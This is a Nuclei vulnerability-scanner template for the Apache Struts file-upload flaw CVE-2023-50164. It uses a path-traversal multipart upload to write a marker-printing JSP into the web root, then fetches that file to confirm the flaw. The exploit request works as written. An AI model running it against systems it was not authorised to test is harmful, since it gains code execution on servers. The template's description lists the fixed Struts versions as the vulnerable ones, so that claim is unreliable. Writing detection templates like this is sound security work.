id: cve-2023-50164-struts-upload-rce

info:
  name: Apache Struts RCE via File Upload (CVE-2023-50164)
  author: OmarSamy
  severity: critical
  description: |
    Apache Struts 2.5.33 and 6.3.0.2+ are vulnerable to a path traversal vulnerability via crafted file upload parameters, leading to RCE.
  reference:
    - https://vulncheck.com/xdb/676c45378050
    - https://github.com/NikitaPark/CVE-2023-50164-PoC
  tags: cve,cve2023,struts,rce,fileupload

variables:
  endpoint: "StrutsUploadApp/upload.action"
  shellname: "shell_{{rand_base(5)}}.jsp"

requests:
  - raw:
      - |
        POST /{{endpoint}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKQeAnc4Qm964UwhY
        Accept-Encoding: gzip

        ------WebKitFormBoundaryKQeAnc4Qm964UwhY
        Content-Disposition: form-data; name="Upload"; filename="{{shellname}}"
        Content-Type: text/plain

        <% out.println("NUCLEI-RCE"); %>
        ------WebKitFormBoundaryKQeAnc4Qm964UwhY
        Content-Disposition: form-data; name="uploadFileName"

        {{traversal}}webapps/ROOT/{{shellname}}
        ------WebKitFormBoundaryKQeAnc4Qm964UwhY--
    payloads:
      traversal:
        - "../"
        - "../../"
        - "../../../"
    attack: clusterbomb

    matchers:
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/{{shellname}}"

    matchers:
      - type: word
        part: body
        words:
          - "NUCLEI-RCE"
      - type: status
        status:
          - 200
